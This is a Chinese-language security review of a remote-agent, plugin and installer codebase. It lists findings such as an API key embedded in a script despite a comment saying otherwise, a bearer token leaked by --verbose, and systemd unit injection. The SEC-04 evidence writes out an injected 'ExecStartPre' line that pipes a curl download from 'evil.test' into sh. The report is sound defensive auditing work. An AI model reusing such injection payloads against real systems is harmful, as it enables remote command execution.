# 安全评审

范围：`remote-agent/src/{auth,http,state,terminal,service,files,config}.ts`、`local-plugin/src/{credentials/proxy,hosts/store,ssh/*}.ts`、`installer/src/{bootstrap,ssh,provision,node,node-remote,commands,npm}.ts`

分支：`review/security`（本轮零改动，全部为报告）　严重度分布：Major 2 / Minor 9 / Note 2

---

## SEC-01　Major　脚本注释谎称「不携带密钥」

**位置**　`packages/installer/src/bootstrap.ts:7` 与 `:227`（对照 `:239`）

**现象**　模块文档写 "never copies model API keys"，脚本头写 "generated, no secrets embedded"，但 direct 模式下 `:239` 用 `shellLiteral` 把真实 key 内嵌为 `MODEL_API_KEY='…'`，`:80` 让它进 systemd unit。

**证据**　实测渲染结果：`header claims no secrets: true` / `key literal present in script: true` / 出现位置 `[14]`。

**影响**　公开仓库的安全审查会据此信任脚本不携带密钥；将来若加 `--api-key` 开关，这条注释就是错误保证。

**建议**　模块文档明确「direct 模式本脚本内嵌密钥」；`no secrets` 改为 `no agent token embedded`。

**状态**　未修

---

<a id="sec-02"></a>
## SEC-02　Major　`--verbose` 泄露 agent bearer token

**位置**　`packages/installer/src/ssh.ts:204`，由 `commands.ts:241`、`:226` 触发

**现象**　`--verbose` 时把远端 stdout 原样写 stderr；而 `discover`/`tunnel` 的远端命令是 `cat -- <agent.json>`，该文件含 agent bearer token。

**证据**　`commands.ts:241`：`const command = \`cat -- ${remoteStatePath(options)} 2>/dev/null\``；`ssh.ts:204`：`if (options.verbose) process.stderr.write(chunk)`；`state.ts:22` 声明该文件内含 `token`；实测 `parseArgs(['discover','--target','h','--verbose']).verbose === true`。

**影响**　**高危**。该 token 授予远端会话读写、终端、文件读取全部权限，且常被粘进 issue/工单。

**建议**　改走只取非敏感字段的方式（远端 `node -e` 只打印 port/pid/agentVersion），或在 `ssh.ts` 增 `suppressStdoutEcho` 让 `discoverState` 显式关掉回显。

**状态**　未修

---

## SEC-03　Minor（当前不可达）　`install --verbose` 会打印整段脚本

**位置**　`packages/installer/src/commands.ts:122`

**现象**　`process.stderr.write(script)` 打印含 `MODEL_API_KEY` 的完整脚本。

**证据**　实测 `fromOptions(parseArgs([...]))` 输出 `MODEL_API_KEY=''`，`parseArgs` 不含任何 model/key 开关 → **今天不可达**；插件侧 `provisioner.ts:123` 固定 `verbose: false`。

**影响**　一旦有人给 CLI 加 `--model-api-key` 或把插件 verbose 打开，key 立刻进终端/journald/CI 日志。

**建议**　删除该行，改为打印脚本字节数；给人看走 `plan`。

**状态**　未修

---

<a id="sec-04"></a>
## SEC-04　Minor　systemd unit 换行注入

**位置**　`packages/installer/src/bootstrap.ts:488-493`（unit 正文来自 `:64-90`）

**现象**　unit 用**未加引号** heredoc 写入，`:72/76/79/80/81/84` 全是 `$VAR` 运行时展开；变量求值后的换行会被原样写进 unit。

**证据**　实测 `--dsh-home '/srv/dsh\nExecStartPre=/bin/sh -c "curl -s http://evil.test/x | sh"'` 生成的 unit 含换行 + 独立 `ExecStartPre=…` 行（`injected ExecStartPre present: true`）。

**影响**　配置注入 → 远端以该账号任意命令执行。注入向量仅限本地插件配置，非远端可控。

**建议**　`renderSystemdUnit` 对注入值做 unit 规范化（禁 `\n`/`\r`/`"`），写 unit 前校验。

**状态**　未修

---

## SEC-05　Minor　`shellPath('$HOME')` 返回字面量

**位置**　`packages/installer/src/bootstrap.ts:50-61`

**现象**　`shellPath('$HOME')` 走不到 `startsWith('$HOME/')` 分支，落到 `shellLiteral` → `'$HOME'`；而 `'~'` 返回 `"$HOME"`。

**证据**　实测 `shellPath('$HOME') → '$HOME'`、`shellPath('~') → "$HOME"`；`parseGlobalPrefix('$HOME')` 明确放行。

**影响**　`--dsh-home '$HOME'` 会把 DSH home 装到名为 `$HOME` 的相对目录，静默错位。

**建议**　前置 `if (value === '$HOME') return '"$HOME"'`，统一处理两种拼写。

**状态**　未修

---

## SEC-06　Minor　`needsNode` 漏 `.ps1`，且 `.cmd` 走 Node 是错的

**位置**　`packages/local-plugin/src/ssh/command.ts:34`、`:42-54`

**现象**　`SCRIPT_EXTENSIONS` 不含 `.ps1`（原样 spawn → `EFTYPE`）；`.cmd/.bat` 被送进 Node，而 Node 无法执行批处理。

**证据**　实测 `needsNode("…ssh.ps1") → false`；`spawnSync('…ps1') → EFTYPE`；`node tsc.cmd → SyntaxError: Invalid or unexpected token at @SETLOCAL`；`.cmd` 直接 spawn → `EINVAL`。

**影响**　只有自定义 `sshBinary` 指向脚本时受影响；注释误导。

**建议**　分三类：`.ps1` 用 `powershell -File` 或显式报错；`.cmd/.bat` 不走 Node，报「用 .js 包装或直接用 ssh.exe」。

**状态**　未修

---

## SEC-07　Minor　安装器的 ssh 调用与插件策略分叉

**位置**　`packages/installer/src/ssh.ts:145`、`:182`、`:236`

**现象**　三处 `spawn(options.binary, …)` 不经过 `resolveCommand`，与插件侧策略分叉：`--ssh /path/ssh.js` 在 Windows 上直接失败。

**证据**　代码原文；`installer/src` 无 `resolveCommand` 引用。

**影响**　同一配置项在两个包里行为不同，`--ssh` 文档承诺落空。

**建议**　三处改为 `resolveCommand(options.binary)` 并展开 `prefixArgs`。

**状态**　未修

---

## SEC-08　Minor　`HostStore.add()` 不做校验就落盘

**位置**　`packages/local-plugin/src/hosts/store.ts:115-126`（对照 `:31-53`）

**现象**　`add()` 不跑 `isHostRecord` 就直接写，而 `load()` 会把这类记录当 malformed 丢弃。

**证据**　实测 `add({token:'short', …})` 成功 → `load()` 得 `hosts: 0` + `warnings: ["host registry entry 0 is malformed and was ignored"]`；`modelSource:'bogus'` 同样。

**影响**　进程内 map 有、重启后消失，随后 `update()` 抛 "does not exist" → 「主机莫名消失」。

**建议**　`#mutate` 里对 `next` 整体跑 `isHostRecord` 并抛 `host/invalid`（与 `update` 同款）。

**状态**　未修

---

## SEC-09　Minor　`chmod 0700` 可能收紧无关目录

**位置**　`packages/remote-agent/src/state.ts:123-124`；`packages/local-plugin/src/hosts/store.ts:162-163`

**现象**　对 stateFile 所在目录（`dirname`）做 `chmod 0700`。若把 `stateFile`/`stateDir` 配到 `~`，会把 `$HOME` 收紧到 0700。

**证据**　`stateDirectory(stateFile) = dirname(stateFile)`；`state.ts:123-124` 先 mkdir 再 chmod。

**影响**　配置异位时静默改动无关目录权限，共享 home 下其他服务可能读不了自己的文件。

**建议**　只 chmod 自己新建的目录（先 `stat` 判断是否已存在），或限制在 `basename === 'waypoint-agent'` 时。

**状态**　未修

---

## SEC-10　Minor　代理逐跳头未过滤

**位置**　`packages/local-plugin/src/credentials/proxy.ts:118-126`

**现象**　头部过滤只剔 `host`/`authorization`/`x-api-key`/`connection`，`keep-alive`、`proxy-connection`、`proxy-authorization` 被原样转给上游。

**证据**　实测上游收到 `[…, keep-alive, proxy-authorization, proxy-connection, …]`。

**影响**　不符合 RFC 7230 逐跳语义；若上游前加真实 HTTP 代理，有请求走私面。

**建议**　跳过集合改为逐跳头白名单剔除；响应侧同理。

**状态**　未修

---

## SEC-11　Minor　`MAX_LINE` 按字符切片但语义是字节

**位置**　`packages/remote-agent/src/files.ts:90-96`

**现象**　`raw.slice(0, MAX_LINE)` + `Buffer.byteLength(raw) > MAX_LINE`，多字节行会「加标记但没截断」。

**证据**　实测 60000 字节单行 + `limit=10` → `first line length: 32786` 且带 `… [line truncated]`；`pageBytes` 仍按字节累计，`MAX_PAGE` 上限有效。

**影响**　单行响应体比设计意图大约 3 倍（CJK）；不越 `MAX_PAGE`，属健壮性。

**建议**　按字节截断后再 decode。

**状态**　未修

---

## SEC-12　Minor　`HostInfo` 把 key 指纹交给浏览器层

**位置**　`packages/remote-agent/src/service.ts:178-182`

**现象**　`modelKeyFingerprint = sha256(DEEPSEEK_API_KEY)`，而 `HostView.hostInfo` 是浏览器可见字段。

**证据**　`service.ts:180-182` 生成，`protocol/src/types.ts:71` 声明，`local-plugin/src/hosts/types.ts:112,235` 把 `hostInfo` 放进 `HostView`；`service.ts:1132` 用它做漂移检测。

**影响**　密钥哈希跨进浏览器层、进日志/快照。对高熵 key 无现实爆破风险，但「永不把派生凭证交出去」的边界被打破。

**建议**　改为只回 `modelKeyConfigured: boolean` + 一次进程启动随机 `keyEpoch`，本地记 epoch 而非哈希（字段可选，向后兼容）。

**状态**　未修

---

## SEC-13 / SEC-14　Note　两处恒时比较已正确

**SEC-13**　`#isProxyToken` 用 `timingSafeEqual` + 长度短路遍历所有 host。多 host 时耗时可区分命中位置，但任一 host 的 token 都可调用共享代理且注入同一把 key，**无越权差异**。建议保持现状。

**SEC-14**　`tokensEqual` 先比长度再 `timingSafeEqual`。长度信息由调用方自己决定，不构成秘密泄漏。不改，可加注释说明为何长度短路可接受。

**状态**　无需修复

---

## 已复核且未发现问题

1. `mintToken` = `randomBytes(32).toString('hex')`（256 bit）；`MIN_TOKEN_LENGTH=16`
2. `parseBearer`：`Bearer abc`→`abc`、`bearer   abc  `→`abc`、`Bearer`/`Basic abc`→`undefined`、数组取首元素；`Bearer a b` 含空格但因全等比较无绕过
3. `isLoopbackAddress`：`127.0.0.1`✓、`::1`✓、`::ffff:127.0.0.1`✓、`::ffff:7f00:1`✗、`127.0.0.2`✗、`::`✗、`0.0.0.0`✗、`undefined`✗ —— 只放行精确 loopback，fail-closed
4. `admitsPeer` = `!loopbackOnly || isLoopbackAddress(addr)`，patch 中 `loopbackOnly: true`
5. `http.ts` 前置顺序：peer → bearer → 协议协商 → 路由 → method，认证先于任何 body 读取
6. `readJsonBody`：`session-prompt` 12 MiB、其余 256 KiB，逐块累计即中断；空 body → `{}`
7. 全部 `as*Request` 均有类型 + 空值校验；`optionalInt` 拒绝 `NaN/Infinity`
8. 请求 id 回显不可注入：Node HTTP 解析器在控制字符上直接 `HPE_INVALID_HEADER_TOKEN`
9. `files.ts` 读面：`statFile` 只接受 `isFile()`；`readText` 有 `MAX_LINE/MAX_PAGE/limit≤2000`；`readBytes` 硬上限 5 MB
10. `files.ts` 不做目录收敛是**已声明的威胁模型**（token = 该远端账号权限），非缺陷
11. `terminal.ts` 无 shell 拼接：全 argv，`cwd` 经 `resolve()`，`cols/rows` 经 `clamp`，`shell` 只接受绝对路径
12. `credentials/proxy.ts` 不可被重定向上游：实测 `//evil.test/x`、`http://evil.test/x`、`/../secret`、`%2e%2e` 等 7 种尝试全部落在同 origin
13. 代理鉴权：先校验再转发；无 token → 401 且上游请求数 0；`authorization`/`x-api-key` 被真 key 覆盖
14. `hosts/store.ts` 落盘：临时文件 + `writeFile(mode:0600)` + `chmod` + `rename`，`#queue` 串行
15. `toHostView` 不泄露秘密：无 `token`/`proxyToken` 字段，`local.test.ts` 有专门用例
16. SSH/SCP argv 从不经过 shell：全仓 `shell: true` 只出现在两处**注释**
17. `parseTarget`/`parseSshTarget` 拒绝选项注入与元字符（`-` 前缀、空白/控制字符、端口 0）
18. `discoveryCommand` 的 `~/` 分支在双引号内转义 `\ " $ \``，`$HOME/...` 走 `shellQuote`
19. `provisioner.ts` 不打印敏感内容：`verbose: false` 硬编码，`onProgress` 经白名单映射
20. `ssh/config.ts` 只读，有 `MAX_INCLUDE_DEPTH=4`/`MAX_CONFIG_FILES=32` 上限

## 越界但值得记录

1. `SECURITY.md` 曾写 `0.8.x`（**已由 tooling 分支修复为 1.0.x**）
2. nohup 模式脚本无顶层 `umask 077`，`web.log` 按默认 umask 建
3. `bootstrap.ts:237` 的 `GLOBAL_PREFIX=` 赋值全脚本无人引用，属死变量
4. `mirror/service.ts` 的 `mkdir(stateDir)` 未传 `mode: 0o700`，`mirrors.json` 只 `mode:0600` 无 `chmod`
5. `installer/src/ssh.ts:292-298` 把远端 stderr 末两行塞进错误消息 → 进本地浏览器 UI
